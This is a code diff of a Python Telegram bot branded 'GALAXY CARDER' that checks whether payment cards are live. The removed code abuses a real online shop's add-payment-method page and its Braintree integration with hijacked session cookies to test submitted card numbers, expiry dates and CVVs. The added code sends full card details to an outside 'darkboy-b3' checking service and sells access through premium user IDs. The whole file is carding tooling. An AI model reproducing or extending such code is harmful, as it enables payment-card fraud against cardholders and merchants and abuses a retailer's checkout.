@@ -1,190 +1,108 @@
 import requests
-import re
 import time
-import base64
-from bs4 import BeautifulSoup
-from user_agent import generate_user_agent
-from telebot import TeleBot
+import os
 
-# Function to get BIN details
-def get_bin_info(bin_number):
+# Path to id.txt file
+ID_FILE = "id.txt"
+
+def is_premium_user(user_id):
+    """Checks if the user is in id.txt and if their premium access is still valid."""
     try:
-        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
-        if response.status_code == 200:
-            data = response.json()
-            bank = data.get("bank", {}).get("name", "Unknown Bank")
-            card_type = data.get("type", "Unknown").capitalize()
-            country = data.get("country", {}).get("name", "Unknown Country")
-            country_emoji = data.get("country", {}).get("emoji", "🌍")
-            return bank, card_type, country, country_emoji
-        else:
-            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
-    except:
-        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
+        if not os.path.exists(ID_FILE):
+            return False  # If the file does not exist, no users have access
 
-# Command handler for /b3
-@bot.message_handler(commands=["b3"])
-def check_card(message):
-    msg = bot.reply_to(message, "🔍 Checking your card, please wait...")
+        with open(ID_FILE, "r") as file:
+            valid_users = []
+            for line in file:
+                parts = line.strip().split(":")  # Use ":" as separator
+                if len(parts) == 2:
+                    stored_id, expiry = parts
+                    if str(user_id) == stored_id:
+                        if time.time() < float(expiry):  # Check if expiry is valid
+                            return True  # User has premium access
+                    else:
+                        valid_users.append(line)  # Keep valid users
 
-    try:
-        card_details = message.text.split()[1]
-        n, mm, yy, cvc = card_details.split("|")
+        # Remove expired users
+        with open(ID_FILE, "w") as file:
+            file.writelines(valid_users)
 
-        if "20" not in yy:
-            yy = f"20{yy}"
-        if len(mm) == 1:
-            mm = f"0{mm}"
+    except Exception as e:
+        print(f"Error checking premium user: {e}")
 
-        user_agent = generate_user_agent()
+    return False  # Default to False if any error occurs
 
-        # Fetch BIN details
-        bin_info = get_bin_info(n[:6])
-        bank_name, card_type, country_name, country_flag = bin_info
+def format_b3_response(api_response, time_taken):
+    """Formats the API response into a structured message with time taken."""
+    lines = api_response.split("\n")
+    data = {}
 
-        cookies = {
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-03-11%2013%3A28%3A33',
-            'sbjs_first_add': 'fd%3D2025-03-11%2013%3A28%3A33',
-            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
-            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29',
-            'cf_clearance': 'Th2Aog2nT4TDGRTbcWP9w3Dz7EFRWedPvO7TC6LNeB4-1741699715',
-            'wordpress_logged_in_b444e0f1bbb883efdac80935bdd84199': 'salokk%7C1742909339',
-            'wfwaf-authcookie-98378724241a3d95191bebf32899230c': '100676%7Cother%7Cread',
-            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fglasshousesupply.com%2Fmy-account%2Fadd-payment-method%2F',
-        }
+    for line in lines:
+        if "𝗖𝗔𝗥𝗗 ➺" in line:
+            data["card"] = line.split("➺")[-1].strip()
+        elif "𝗘𝗫𝗣𝗜𝗥𝗬 ➺" in line:
+            data["expiry"] = line.split("➺")[-1].strip()
+        elif "𝗖𝗩𝗩 ➺" in line:
+            data["cvv"] = line.split("➺")[-1].strip()
+        elif "𝗕𝗔𝗡𝗞 𝗡𝗔𝗠𝗘 ➺" in line:
+            data["bank"] = line.split("➺")[-1].strip()
+        elif "𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➺" in line:
+            data["response"] = line.split("➺")[-1].strip()
+        elif "𝗦𝗧𝗔𝗧𝗨𝗦 ➺" in line:
+            status_text = line.split("➺")[-1].strip()
+            data["status"] = "❌ Dead" if "Dead" in status_text else "✅ Live" if "Live" in status_text else "⚠️ Unknown"
 
-        headers = {
-            'authority': 'glasshousesupply.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://glasshousesupply.com',
-            'referer': 'https://glasshousesupply.com/my-account/add-payment-method/',
-            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': user_agent,
-        }
-
-        response = requests.get(
-            "https://glasshousesupply.com/my-account/add-payment-method/",
-            cookies=cookies,
-            headers=headers,
-        )
-
-        i0 = response.text.find('wc_braintree_client_token = ["')
-        i1 = response.text.find('"]', i0)
-        encoded_text = response.text[i0 + 30 : i1]
-        decoded_text = base64.b64decode(encoded_text).decode("utf-8")
-
-        au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
-
-        headers_braintree = headers.copy()
-        headers_braintree.update({
-            "authorization": f"Bearer {au}",
-            "braintree-version": "2018-05-10",
-            "content-type": "application/json",
-            "origin": "https://assets.braintreegateway.com",
-        })
-
-        json_data = {
-            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-                tokenizeCreditCard(input: $input) {
-                    token
-                    creditCard {
-                        bin brandCode last4 expirationMonth expirationYear
-                        binData { prepaid debit issuingBank countryOfIssuance }
-                    }
-                }
-            }""",
-            "variables": {
-                "input": {
-                    "creditCard": {
-                        "number": n,
-                        "expirationMonth": mm,
-                        "expirationYear": yy,
-                        "cvv": cvc,
-                        "billingAddress": {"postalCode": "90001", "streetAddress": "Avocado Ave"},
-                    },
-                    "options": {"validate": False},
-                },
-            },
-        }
-
-        response = requests.post(
-            "https://payments.braintree-api.com/graphql",
-            headers=headers_braintree,
-            json=json_data,
-        )
-
-        if "token" not in response.text:
-            bot.edit_message_text("⚠️ Invalid response from Braintree!", message.chat.id, msg.message_id)
-            return
-
-        tok = response.json()["data"]["tokenizeCreditCard"]["token"]
-
-        data = {
-            'payment_method': 'braintree_cc',
-            'braintree_cc_nonce_key': tok,
-            'braintree_cc_device_data': '{"device_session_id":"f3b62b2059128666273f76de659fb76e","fraud_merchant_id":null,"correlation_id":"e9be3974-e5c7-45b9-b04f-89b98060"}',
-            'braintree_cc_3ds_nonce_key': '',
-            'braintree_cc_config_data': decoded_text,
-            'woocommerce-add-payment-method-nonce': 'ba76a0b9ff',
-            '_wp_http_referer': '/my-account/add-payment-method/',
-            'woocommerce_add_payment_method': '1',
-        }
-
-        response = requests.post(
-            "https://glasshousesupply.com/my-account/add-payment-method/",
-            cookies=cookies,
-            headers=headers,
-            data=data,
-        )
-
-        soup = BeautifulSoup(response.text, "html.parser")
-        error_msg = soup.find("ul", class_="woocommerce-error")
-
-        if error_msg:
-            error_text = error_msg.text.strip()
-            if "Declined" in error_text:
-                status = "❌ Declined"
-            elif "No Account" in error_text:
-                status = "⚠️ No Account"
-            elif "Processor Declined" in error_text:
-                status = "🚫 Processor Declined"
-            else:
-                status = "❌ Unknown Decline"
-        else:
-            status = "✅ Approved"
-
-        response_text = f"""
-╭─━━━━━━━━━━━━━━━━━━━─╮
-    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
-╰─━━━━━━━━━━━━━━━━━━━─╯
-
-📌 **Card:** `{n}|{mm}|{yy}|{cvc}`
-📌 **Status:** {status}
-📌 **Gateway:** `Braintree Auth`
-📌 **BIN:** `{tok[:6]}`
-📌 **Bank:** `{bank_name}` 
-📌 **Type:** `{card_type}`
-📌 **Country:** `{country_name} {flag}`
-📌 **Checked By:** `@{message.from_user.username}`
-📌 **Response Time:** `{round(time.time() - message.date, 2)}s`
-
-╭─━━━━━━━━━━━━━━━─╮
- 🔥 𝐆𝐀𝐋𝐀𝐗𝐘 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 🔥
-╰─━━━━━━━━━━━━━━━─╯
+    formatted_message = f"""
+<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
+<b>🔥 𝐁𝐑𝐀𝐈𝐍𝐓𝐑𝐄𝐄 𝐀𝐔𝐓𝐇 🔥</b>
+<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
+<b>💳 𝑪𝒂𝒓𝒅:</b> <code>{data.get("card", "N/A")}</code>  
+<b>📆 𝑬𝒙𝒑𝒊𝒓𝒚:</b> <code>{data.get("expiry", "N/A")}</code>  
+<b>🔑 𝑪𝑽𝑽:</b> <code>{data.get("cvv", "N/A")}</code>  
+<b>🏦 𝑩𝒂𝒏𝒌:</b> <b><u>{data.get("bank", "N/A")}</u></b>  
+<b>📌 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆:</b> <b><i>{data.get("response", "N/A")}</i></b>  
+<b>⚡ 𝑺𝒕𝒂𝒕𝒖𝒔:</b> <b><i>{data.get("status", "N/A")}</i></b>  
+<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
+<b>⏱ Time Taken:</b> <code>{time_taken:.2f} sec</code>  
+<b>👑 𝘽𝙊𝙏 𝘽𝙔:</b> <code>GALAXY CARDER 🥷</code>
+<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
 """
+    return formatted_message
 
-bot.edit_message_text(response_text, message.chat.id, msg.message_id, parse_mode="Markdown")
+def send_progress_message(bot, chat_id):
+    """Sends a processing message with a loading animation."""
+    progress_messages = [
+        "<b>🔄 Processing Card...</b>",
+        "<b>🔄 Checking Details...</b>",
+        "<b>🔄 Verifying with Braintree...</b>",
+        "<b>🔄 Almost Done...</b>",
+    ]
+    progress_msg = bot.send_message(chat_id, progress_messages[0], parse_mode="HTML")
+    
+    for i in range(1, len(progress_messages)):
+        time.sleep(2)  # Simulate processing time
+        bot.edit_message_text(progress_messages[i], chat_id, progress_msg.message_id, parse_mode="HTML")
+    
+    return progress_msg
 
-bot.polling()
+def check_braintree(bot, message, card_details):
+    """Checks if the user has premium access, shows processing animation, and then fetches the result."""
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    if not is_premium_user(user_id):
+        bot.send_message(chat_id, "<b>🚫 Access Denied:</b> You are not a premium user or your access has expired.", parse_mode="HTML")
+        return
+
+    progress_msg = send_progress_message(bot, chat_id)  # Show processing animation
+
+    start_time = time.time()
+    url = f"https://darkboy-b3.onrender.com/key=dark/cc={card_details}"
+    response = requests.get(url)
+
+    if response.status_code == 200:
+        formatted_response = format_b3_response(response.text, time.time() - start_time)
+    else:
+        formatted_response = "<b>❌ Error:</b> Unable to process request."
+
+    bot.edit_message_text(formatted_response, chat_id, progress_msg.message_id, parse_mode="HTML")
